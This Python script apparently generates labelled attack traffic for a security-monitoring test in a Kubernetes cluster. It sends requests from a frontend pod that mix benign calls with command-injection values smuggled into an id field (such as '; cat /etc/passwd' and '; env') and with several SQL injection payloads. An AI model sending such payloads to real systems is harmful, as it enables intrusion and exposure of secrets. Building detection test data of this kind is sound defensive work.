import subprocess
import time
import random
import urllib.parse

def get_pod_name(app_label, namespace="default"):
    cmd = f"kubectl get pods -n {namespace} -l app={app_label} -o jsonpath='{{.items[0].metadata.name}}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def run_request(source_pod, target_svc, port, path, timeout=3):
    # Using wget -qO- to execute the request from within the frontend pod
    cmd = f"kubectl exec -n default {source_pod} -- wget -qO- -T {timeout} \"http://{target_svc}:{port}{path}\""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    status = "OK" if result.returncode == 0 else "FAIL/BLOCKED"
    print(f"[{source_pod}] -> GET {path[:60]}... ({status})")

def generate_test_traffic():
    print("💀 Initializing OmniFinance SOC Test Simulator (Local RCE & SQLi)...")
    
    frontend_pod = get_pod_name("frontend-ui")
    
    if not frontend_pod:
        print("❌ Error: Could not find frontend-ui pod.")
        return

    # 1. Command Injection (RCE) Payloads - STRICTLY LOCAL RECON
    rce_payloads = [
        "L-101; cat /etc/passwd",
        "L-102; env",
        "L-103; ls -la /",       # Local directory listing instead of lateral movement
        "L-104; whoami",         # User context check instead of internal probe
        "L-105; ps aux"          # Process listing instead of external exfiltration
    ]

    # 2. SQL Injection Payloads targeting the Account Service
    sqli_payloads = [
        "1 OR 1=1",                                     # Boolean Based Auth Bypass
        "1' OR '1'='1",                                 # String Based Auth Bypass
        "1 UNION SELECT null, version(), null, null",   # Union Based Recon
        "1; SELECT pg_sleep(2)--",                      # Time Based Blind SQLi
        "1' AND (SELECT 1/0)--"                         # Error Based SQLi
    ]

    print("\n--- PHASE 1: Benign Baseline Noise ---")
    for _ in range(15):
        acc_id = random.randint(1, 25)
        run_request(frontend_pod, "api-gateway", 8080, f"/api/accounts?id={acc_id}")
        time.sleep(0.2)

    print("\n--- PHASE 2: Injecting RCE & SQLi Attacks ---")
    for _ in range(15):
        attack_type = random.choice(["RCE", "SQLI"])
        
        if attack_type == "RCE":
            raw_payload = random.choice(rce_payloads)
            encoded_payload = urllib.parse.quote(raw_payload)
            run_request(frontend_pod, "api-gateway", 8080, f"/api/loans/export?id={encoded_payload}")
        else:
            raw_payload = random.choice(sqli_payloads)
            encoded_payload = urllib.parse.quote(raw_payload)
            run_request(frontend_pod, "api-gateway", 8080, f"/api/accounts?id={encoded_payload}")
            
        time.sleep(0.5)

    print("\n--- PHASE 3: Return to Normalcy ---")
    for _ in range(10):
        loan_id = random.randint(101, 125)
        run_request(frontend_pod, "api-gateway", 8080, f"/api/loans/export?id=L-{loan_id}")
        time.sleep(0.2)

    print("\n✅ Test traffic generation complete! Extract to data/raw/hubble_test_data.json")

if __name__ == "__main__":
    generate_test_traffic()